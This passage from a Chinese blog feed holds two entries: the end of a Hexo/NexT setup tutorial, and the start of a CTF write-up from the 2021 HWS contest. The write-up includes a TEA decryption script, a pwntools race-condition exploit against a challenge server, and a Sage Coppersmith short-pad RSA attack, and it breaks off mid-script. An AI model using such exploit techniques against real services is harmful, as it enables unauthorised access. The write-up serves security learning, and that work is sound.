align="left"><code>pretty_urls.trailing_html</code></td><td align="left">是否在永久链接中保留尾部的 <code>.html</code>, 设置为 <code>false</code> 时去除 (<em>对尾部的 <code>index.html</code>无效</em>)</td><td align="left"><code>true</code></td></tr></tbody></table></li></ul><p>剩下的一些基本不用改，想知道可以点<a href="https://hexo.io/zh-cn/docs/configuration.html">参考链接</a>去看一下</p></li><li><p>Local Search插件</p><ul><li><p> npm install hexo-generator-searchdb –save </p></li><li><p>修改<code>hexo/_config.yml</code>站点配置文件，新增以下内容到任意位置： </p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">search:</span></span><br><span class="line"><span class="symbol">    path:</span> search.xml</span><br><span class="line"><span class="symbol">    field:</span> post</span><br><span class="line"><span class="symbol">    format:</span> html</span><br><span class="line"><span class="symbol">    limit:</span> <span class="number">10000</span> </span><br></pre></td></tr></table></figure></li><li><p> 编辑 <strong>themes里的配置文件</strong>，启用本地搜索功能，将Local Search里改为True即可，generate,deploy 后可在页面内搜索</p></li></ul></li><li><p>设置图标</p><ul><li><p>找一张喜欢的 ico 图标 ， 并将图标名称改为 favicon.ico，然后把图标放在 <code>/themes/next/source/images</code> 里，并且修改主题配置文件：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">favicon:</span></span><br><span class="line"><span class="symbol">  small:</span> <span class="meta-keyword">/images/</span>favicon.ico</span><br><span class="line"><span class="symbol">  medium:</span> <span class="meta-keyword">/images/</span>favicon.ico</span><br></pre></td></tr></table></figure></li></ul></li><li><p>开启自定义swig文件功能</p><ul><li> 将 <code>custom_file_path:</code> 属性下面的值全部取消注释, 并且在<strong>网站根目录</strong>下的 source 文件夹中新建 <code>_data</code> 文件夹, 注意不是在主题根目录下的 source 文件夹中新建. 之后在 <code>_data</code> 文件夹中将对应的所有文件全部手动创建好(因为不会自动创建). 之后如果要自定义样式, 直接修改这些文件就行了. </li><li>比如想要自定义背景就要改styles.styl</li></ul></li><li><p>添加阅读量统计功能</p><ul><li><p>还有一种是<a href="https://theme-next.js.org/docs/theme-settings/posts.html?highlight=wordcount#Post-Wordcount">post-wordcount</a>,这个不行就下面这个。</p></li><li><p>直接主题配置文件里找busuanzi:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">busuanzi_count:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_visitors_icon:</span> <span class="string">fa</span> <span class="string">fa-user</span></span><br><span class="line">  <span class="attr">total_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br><span class="line">  <span class="attr">post_views:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_views_icon:</span> <span class="string">fa</span> <span class="string">fa-eye</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>开启RSS订阅</p><ul><li> npm install –save hexo-generator-feed </li><li> 在主题配置文件中搜索 rss 设置为: <code>rss: /atom.xml</code> </li></ul></li><li><p>头像显示</p><ul><li><p>更改 Next 主题的配置文件 <code>themes/next/_config.yml</code>，设置以下内容 </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">avatar:</span></span><br><span class="line">  <span class="attr">url:</span> <span class="string">/images/avatar.png</span>      <span class="comment"># 头像图片</span></span><br><span class="line">  <span class="attr">rounded:</span> <span class="literal">true</span>                <span class="comment"># 头像显示在圆里</span></span><br><span class="line">  <span class="attr">rotated:</span> <span class="literal">true</span>                <span class="comment"># 鼠标焦点落在头像时，是否转动头像</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>添加背景图片和透明度</p><ul><li><p><code>hexo</code>目录下，在<code>source/_data</code>(<code>_data</code>目录之前没手动创建过的话要手动创建)下新建<code>styles.styl</code>，内容为 </p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"> <span class="attribute">background</span>:url(/images/background.jpg);</span><br><span class="line"> <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">    <span class="attribute">background-attachment</span>:fixed;</span><br><span class="line">    <span class="attribute">background-position</span>:<span class="number">50%</span> <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">background-size</span>:<span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;    </span><br><span class="line"><span class="comment">// 文章主体透明度</span></span><br><span class="line"><span class="selector-class">.main-inner</span>&#123;</span><br><span class="line"><span class="attribute">opacity</span>: <span class="number">0.9</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 放置头像等的边栏透明度</span></span><br><span class="line"><span class="selector-class">.sidebar</span>&#123;</span><br><span class="line"><span class="attribute">opacity</span>: <span class="number">0.7</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 标题等头部透明度</span></span><br><span class="line"><span class="selector-class">.header-inner</span>&#123;</span><br><span class="line"><span class="attribute">opacity</span>: <span class="number">0.7</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 底部透明度</span></span><br><span class="line"><span class="selector-class">.footer-inner</span>&#123;</span><br><span class="line"><span class="attribute">color</span>:black;</span><br><span class="line"><span class="attribute">opacity</span>: <span class="number">0.7</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>说明：</p><ul><li>background:图片路径，也可以直接使用链接</li><li>background-repeat：若果背景图片不能全屏，那么是否平铺显示，充满屏幕，no-repeat不平铺</li><li>background-attachment：背景是否随着网页上下滚动而滚动，fixed为当页面的其余部分滚动时，背景图像不会移动</li><li>background-position：就是调整图片的位置</li><li>background-size：图片展示大小，这里如果设置100% 100%，当背景图片不能全屏，通过拉伸的方式将背景强制拉伸至全屏显示。如果不添加，图片虽然不会完整显示，但不会因为拉伸变形。个人更喜欢不加这个属性。</li></ul><p>然后在<code>next</code>主题的<code>_config.yml</code>下<code>custom_file_path</code>解开<code>style: source/_data/styles.styl</code>注释。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Define custom <span class="keyword">file</span> paths.</span><br><span class="line"># Create your custom files in site directory `<span class="keyword">source</span>/_data` and uncomment needed files below.</span><br><span class="line">custom_file_path:</span><br><span class="line">  #head: <span class="keyword">source</span><span class="regexp">/_data/</span>head.njk</span><br><span class="line">  #header: <span class="keyword">source</span><span class="regexp">/_data/</span>header.njk</span><br><span class="line">  #sidebar: <span class="keyword">source</span><span class="regexp">/_data/</span>sidebar.njk</span><br><span class="line">  #postMeta: <span class="keyword">source</span><span class="regexp">/_data/</span>post-meta.njk</span><br><span class="line">  #postBodyEnd: <span class="keyword">source</span><span class="regexp">/_data/</span>post-body-end.njk</span><br><span class="line">  #footer: <span class="keyword">source</span><span class="regexp">/_data/</span>footer.njk</span><br><span class="line">  footer: <span class="keyword">source</span><span class="regexp">/_data/</span>footer.swig</span><br><span class="line">  #bodyEnd: <span class="keyword">source</span><span class="regexp">/_data/</span>body-end.njk</span><br><span class="line">  #variable: <span class="keyword">source</span><span class="regexp">/_data/</span>variables.styl</span><br><span class="line">  #mixin: <span class="keyword">source</span><span class="regexp">/_data/mi</span>xins.styl</span><br><span class="line">  style: <span class="keyword">source</span><span class="regexp">/_data/</span>styles.styl</span><br></pre></td></tr></table></figure></li><li><p>在后在<code>next</code>主题的<code>source/images</code>目录下添加<code>background.jpg</code>文件,重新启动<code>hexo</code>。 </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo cl</span></span><br><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo s</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>七牛云图床：</p><ul><li><a href="https://cloud.tencent.com/developer/article/1662807">https://cloud.tencent.com/developer/article/1662807</a></li><li>需要注意的是在七牛云创建自己的域名的CDN加速域名时，他的文档叙述有点坑。</li><li>比如我的域名是l3m0nade.xyz，利用此域名创建CDN加速域名，按照他的引导创建，需要输入一个普通域名，这是输入qiniu.l3m0nade.xyz这种二级域名。</li><li>然后会给你一个xxxxx-qiniudns.com,然后要去阿里云域名解析控制台域名解析那里，添加记录，前缀要为qiniu和注册CDN加速域名时对应，CNAME解析，主机记录为这个给你的xxxxx-qiniudns.com。<ul><li>在国内网，访问你的图片CDN url还是挺快的，但你要挂个梯子，浏览器里就会很慢很慢甚至出不来。</li><li>然后发现本地调试挺快没问题，但是上传到github上的，hexo去解析qiniu就会慢到加载不出来。。。</li><li>F12可以看到不沦我的图片是在niqiu还是在github加载，都会是：err_ssl_version_or_cipher_mismatch</li><li>发现问题是我的图片qiniu连接是http的，证书问题，没有证书。而github那个是真的慢。没有证书问题，在firefox上就能很快加载出来，但是chrome不行。。。</li></ul></li></ul></li></ul><h2 id="使用typora写文档"><a href="#使用typora写文档" class="headerlink" title="使用typora写文档"></a>使用typora写文档</h2><ul><li><p>已经写好的md文档*1,里面的图片建议用七牛云存储，放入https的链接。</p></li><li><p>放在/source/_post里</p></li><li><p>要给文档开头加上：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hexo博客搭建详细教程 一文通</span><br><span class="line">date: 2021-09-07 0:29</span><br><span class="line">tags: [Hexo]</span><br><span class="line">---</span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">jQuery对表单的操作及更多应用</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2017-05-26 12:12:57</span></span><br><span class="line"><span class="attr">categories:</span> </span><br><span class="line"><span class="bullet">-</span> <span class="string">web前端</span></span><br><span class="line"><span class="attr">tags:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">jQuery</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">表格</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">表单验证</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure><ul><li>博客里不能一篇文章太长全出现，在适当地方加入<!--more-->来分割前面部分为摘要。</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>（Hexo搭建博客资料很多很杂，不推荐使用宝塔，可能在配置过程中被新版宝塔卡主。这里推荐的几篇和文中的参考链接基本就够用了。）</p><p><a href="http://num0.top/2020/04/19/%E5%BD%BB%E5%BA%95%E6%90%9E%E6%87%82%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Hexo-GitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/">Hexo+Github Pages搭建个人博客</a></p><p><a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo插件，美化</a></p><p><a href="https://www.bilibili.com/read/cv12633102">保姆级教程</a></p><p><a href="https://www.techgrow.cn/posts/755ff30d.html">Next配置</a></p><p><a href="https://theme-next.js.org/plugins/">hexo8.0_plugin官网说明</a></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li><p>如果改了主题后，怎么改都没反应，clean,g,d了也没反应，本地调试和网上不一样，把.gitkeep删掉。</p></li><li><p>typora那个代码块选择语言最好不要选，传上去hexo解析不了反而不会出现代码块高亮</p></li><li><p>不要在代码块之前用*空格的小标题符号</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;提纲&quot;&gt;&lt;a href=&quot;#提纲&quot; class=&quot;headerlink&quot; title=&quot;提纲&quot;&gt;&lt;/a&gt;提纲&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;本篇教程适用于从0.1-1搭建Hexo博客的师傅，对于一些初始环境配置和微小操作可能会忽略到，但这不会影响整体搭建博客的过程。&lt;/li&gt;
&lt;li&gt;Hexo博客可以选择Hexo+Github Pages架构或者Hexo+Github Pages+你的服务器（有无域名都可）。第二种就是第一种做了对服务器的迁移，需要一些git认证和nginx配置和域名解析设置。&lt;/li&gt;
&lt;li&gt;所以下文会进行从第一种到第二种的全部实现过程。以及一些小的美化。&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Hexo" scheme="http://blog.l3m0nade.xyz/categories/Hexo/"/>
    
    
    <category term="Hexo" scheme="http://blog.l3m0nade.xyz/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>2021HWS线上夏令营入营赛</title>
    <link href="http://blog.l3m0nade.xyz/2021/08/31/L3m0nade_HWSwp/"/>
    <id>http://blog.l3m0nade.xyz/2021/08/31/L3m0nade_HWSwp/</id>
    <published>2021-08-30T16:00:00.000Z</published>
    <updated>2021-09-23T03:40:19.197Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021HWS-By-L3m0nade"><a href="#2021HWS-By-L3m0nade" class="headerlink" title="2021HWS By L3m0nade"></a>2021HWS By L3m0nade</h1><h2 id="0x00-aet-reverse"><a href="#0x00-aet-reverse" class="headerlink" title="0x00 aet-reverse"></a>0x00 aet-reverse</h2><p>​        程序名是xtea但其实是tea,找到源python脚本调一下看一下数据大小端后就行了。看了flag原来真的想骗我分辨xtea,tea…</p><span id="more"></span><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="attribute">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> TeaDec(v, k):</span><br><span class="line">    <span class="attribute">v0</span> = v[<span class="number">0</span>]</span><br><span class="line">    <span class="attribute">v1</span> = v[<span class="number">1</span>]</span><br><span class="line">    <span class="attribute">x</span> = <span class="number">0</span>xC<span class="number">6</span>EF<span class="number">3720</span></span><br><span class="line">    <span class="attribute">delta</span> = <span class="number">0</span>x<span class="number">9</span>E<span class="number">3779</span>B<span class="number">9</span></span><br><span class="line">    <span class="comment"># each k 32bit 8bytes</span></span><br><span class="line">    <span class="attribute">k0</span> = k[<span class="number">0</span>]</span><br><span class="line">    <span class="attribute">k1</span> = k[<span class="number">1</span>]</span><br><span class="line">    <span class="attribute">k2</span> = k[<span class="number">2</span>]</span><br><span class="line">    <span class="attribute">k3</span> = k[<span class="number">3</span>]</span><br><span class="line">    <span class="attribute">for</span> i in range(<span class="number">32</span>):</span><br><span class="line">        <span class="attribute">v1</span> -= ((v<span class="number">0</span> &lt;&lt; <span class="number">4</span>) + k<span class="number">2</span>) ^ (v<span class="number">0</span> + x) ^ ((v<span class="number">0</span> &gt;&gt; <span class="number">5</span>) + k<span class="number">3</span>)</span><br><span class="line">        <span class="attribute">v1</span> = v<span class="number">1</span> &amp; <span class="number">0</span>xFFFFFFFF</span><br><span class="line">        <span class="attribute">v0</span> -= ((v<span class="number">1</span> &lt;&lt; <span class="number">4</span>) + k<span class="number">0</span>) ^ (v<span class="number">1</span> + x) ^ ((v<span class="number">1</span> &gt;&gt; <span class="number">5</span>) + k<span class="number">1</span>)</span><br><span class="line">        <span class="attribute">v0</span> = v<span class="number">0</span> &amp; <span class="number">0</span>xFFFFFFFF</span><br><span class="line">        <span class="attribute">x</span> -= delta</span><br><span class="line">        <span class="attribute">x</span> = x &amp; <span class="number">0</span>xFFFFFFFF</span><br><span class="line">    <span class="attribute">v</span>[<span class="number">0</span>] = v<span class="number">0</span></span><br><span class="line">    <span class="attribute">v</span>[<span class="number">1</span>] = v<span class="number">1</span></span><br><span class="line">    <span class="attribute">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="attribute">key</span> =<span class="meta"> [0x10304,0x5060708,0x90a0b0c,0xd0e0f00]</span></span><br><span class="line">    <span class="attribute">enc</span> =<span class="meta"> [0x42C7CA40, 0xC17516EF,0xE7376E69,0x1B0B0F78, 0xDFE0E07B, 0x5F505705, 0xF473D235, 0x47D56C5A]</span></span><br><span class="line">    <span class="attribute">s</span> = b&#x27;&#x27;</span><br><span class="line">    <span class="attribute">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">        <span class="attribute">e</span> =<span class="meta"> [enc[i*2],enc[i*2+1]]</span></span><br><span class="line">        <span class="attribute">dec</span> = TeaDec(e, key)</span><br><span class="line">        <span class="comment">#print(dec,hex(dec[0]),hex(dec[1]),type(hex(dec[0])))</span></span><br><span class="line">        <span class="attribute">s</span> += binascii.unhexlify(hex(dec[<span class="number">0</span>])[<span class="number">2</span>:]) + binascii.unhexlify(hex(dec[<span class="number">1</span>])[<span class="number">2</span>::])</span><br><span class="line">    <span class="attribute">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;th1s_is_TEA_enc0de_hahaha_&#125;</span></span><br></pre></td></tr></table></figure><h2 id="0x01-shop"><a href="#0x01-shop" class="headerlink" title="0x01 shop"></a>0x01 shop</h2><p>​        拿到手是一个64位的ELF文件，提供购物与卖出功能，但是钱不够买flag，在ida64中查看该程序，发现实现卖出功能的函数:</p><p><img src="C:\Users\L3m0nade\Desktop\image-20210824020802214.png"></p><p>函数先检查要卖的物品是否存在，之后创建子进程实现余额的更改与物品的卖出，然后并不等待子进程而是直接继续运行。在子进程中，函数先检查背包中物品种类并提供对应的钱，再在usleep()了约141ms后才讲背包中的物品取走，存在条件竞争漏洞。考虑在这段时间内再次卖出未取走的物品。运行脚本，可以看到产生了两次成功的卖出。有397吧。多亏了sleep，让程序在重复接收指令可以运作出现条件竞争。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf<span class="number">-8</span> </span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="built_in">debug</span> = <span class="number">0</span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="built_in">debug</span>:  </span><br><span class="line">   <span class="built_in">io</span> = process(<span class="string">&#x27;./shop&#x27;</span>)  </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">   addr = <span class="string">&#x27;node4.buuoj.cn&#x27;</span>  </span><br><span class="line">   port = <span class="number">29713</span></span><br><span class="line">   <span class="built_in">io</span> = remote(addr,port)  </span><br><span class="line">     </span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"><span class="built_in">io</span>.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;Which one?&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span>.send(<span class="string">&quot;0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0/n3/n0&quot;</span>)</span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.interactive()  </span><br><span class="line">#flag&#123;fec8625d<span class="number">-7651</span><span class="number">-4213</span>-ba55<span class="number">-36</span>ceb719516f&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-Hello"><a href="#0x02-Hello" class="headerlink" title="0x02 Hello"></a>0x02 Hello</h2><p>Coppersmith–Short-Pad-Attack</p><p>​        由于数据包中必有server.py传输的字符串，所以可以通过，tcp contains Hello找到2个数据，Alice和Bob的传输密文。又因为传输的都是m+padding的密文，有很大部分bit都是相同的，最初想到related-message-attack，但是不太会写。后来找到一个有c1,c2的相关攻击升级版Coppersmith–Short-Pad-Attack脚本可以直接用，改了一下在sagecell上跑的：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="attribute">import</span> binascii</span><br><span class="line"><span class="attribute">def</span> short_pad_attack(c<span class="number">1</span>, c<span class="number">2</span>, e, n):</span><br><span class="line">    <span class="attribute">PRxy</span>.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attribute">PRx</span>.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attribute">PRZZ</span>.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    <span class="attribute">g1</span> = x^e - c<span class="number">1</span></span><br><span class="line">    <span class="attribute">g2</span> = (x+y)^e - c<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">q1</span> = g<span class="number">1</span>.change_ring(PRZZ)</span><br><span class="line">    <span class="attribute">q2</span> = g<span class="number">2</span>.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    <span class="attribute">h</span> = q<span class="number">2</span>.resultant(q<span class="number">1</span>)</span><br><span class="line">    <span class="attribute">h</span> = h.univariate_polynomial()</span><br><span class="line">    <span class="attribute">h</span> = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    <span class="attribute">h</span> = h.monic()</span><br><span class="line"></span><br><span class="line">    <span class="attribute">kbits</span> = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    <span class="attribute">diff</span> = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0</span>.<span class="number">5</span>)[<span class="number">0</span>]  # find root &lt; <span class="number">2</span>^kbits with factor &gt;= n^<span class="number">0</span>.<span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="attribute">def</span> related_message_attack(c<span class="number">1</span>, c<span class="number">2</span>, diff, e, n):</span><br><span class="line">    <span class="attribute">PRx</span>.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attribute">g1</span> = x^e - c<span class="number">1</span></span><br><span class="line">    <span class="attribute">g2</span> = (x+diff)^e - c<span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="attribute">def</span> gcd(g<span class="number">1</span>, g<span class="number">2</span>):</span><br><span class="line">        <span class="attribute">while</span> g<span class="number">2</span>:</span><br><span class="line">            <span class="attribute">g1</span>, g<span class="number">2</span> = g<span class="number">2</span>, g<span class="number">1</span> % g<span class="number">2</span></span><br><span class="line">        <span class="attribute">return</span> g<span class="number">1</span>.monic()</span><br><span class="line"></span><br><span class="line">    <span class="attribute">return</span> -gcd(g<span class="number">1</span>, g<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="attribute">n</span> = <span class="number">614841097302605203729955929451825826385630731245407304765444050136152160075416270232196891310754756560269306196561606156336813576913594854840164982931848631424774407292521710362012687934093478900284954122708280664707569091235654868301000525395360078939629380968427451630817415966643152395544725253378817336057650951709472150327395955690738068905556599556048143267959045123493403335580464278218470115001795745184558268225092224619641577591099718668732317701349174398992357749748300972812469018580873052325022765470680889385640174127657770334108999912438577122235575684290868585158464471335044106696596310903161046624897870198499582743991296379992702316645220124590338066703166528127792814503559512520239899562796644117918668854617138574268684819163423283186676870272524173353359508565110680846340027745804501343277615801570161341159399030712301208921532219260984718701528073369562514559969874210515647810613697008011307213411257388079256334292994617864207389735727092704030522132125141994059978274145655095107101848352464355417969218835698138188967409918358594915938655738516761338882364547606993485361276412819595508391665123030799494192932148904512867616718323946620838822942360634114453262536609403878810013093786418173028142285209</span> </span><br><span class="line">    <span class="attribute">e</span> = <span class="number">7</span></span><br><span class="line">    <span class="attribute">c1</span> = <span class="number">226199888918448644756982227968746328321985116022301858554198443672166664046511192215268564345898426376094090283902459640110441636420726770010000770994806563185277269200465979320365589893377418069091918532090442396603886751603663167305733566867710881487792435263851954036765024355077627565776101657845285994047225127259478223888842725657697619882058952675576467950522546405944727325816748748400930757072151974753803411875075825410215662132323783283622907642504349895222420194846774972358784353404930471430363282533597528847457511272893938256828008761907527515772662467469811929535936626565593800263948227574689518705440414368634213587105988741446978367368641973256822769215908784220309789734449328751828411012817796805182907296099522060377249696752489510340595152805018457215119257756500416362241433542631282380670560802965990054464183825706649810872267539076088793023183611390929368000088538174212497557317021558232130649505658714311457845634746833717519922531826151283006638342214774466523934632839617828984102088907011083393633695252458688340500110194100303563736683350582103762865754280928068416609493507422758397519930389697891015054896887103350205876203508540259064385048758693455947681367170495861484799223471818419141809766082</span></span><br><span class="line">    <span class="attribute">c2</span> = <span class="number">207745134179372733555510206619693253104579843394896629739037329373112962626246001660692996105153219118802888232147542928402067843843528586661320609669764821619654148259323979346482619518127693134276997096465301242211338219230471535362522814373937363157952621289752500159789059618277078792730676938098151778724478618510442014061057398587899271302933994977686954557140792181120737121774640968270568182678321489463357386240195482174580855571460603588887113368877542370808084357842481355072918452814741564939655765498035870034623573615277107259501397135275787715228937905326258102800307298720705403841763666842176243959137647629868288744563301081604801635616954497347143042211051515138964208862089552048752128912810909730479659450966735343696566762894334249104817494914722566979492521404452789748171845406174662299522224640406957367515731398609433619859550730046552804426613174272338408295496475455377327126232203966170727191424458552984898420495331422888174501682405492889556485885498653026394829501033795561393942827468916484256939660461234831948497296037001984268948594694380490331513700030501310813656424424549981824937813623457529801230191235415350842735918693953674061739761952989693408739389294218794993885245118233185798993030811</span></span><br><span class="line">    </span><br><span class="line">    <span class="attribute">diff</span> = short_pad_attack(c<span class="number">1</span>, c<span class="number">2</span>, e, n)</span><br><span class="line">    <span class="attribute">print</span> (<span class="string">&quot;difference of two messages is %d&quot;</span> % diff)</span><br><span 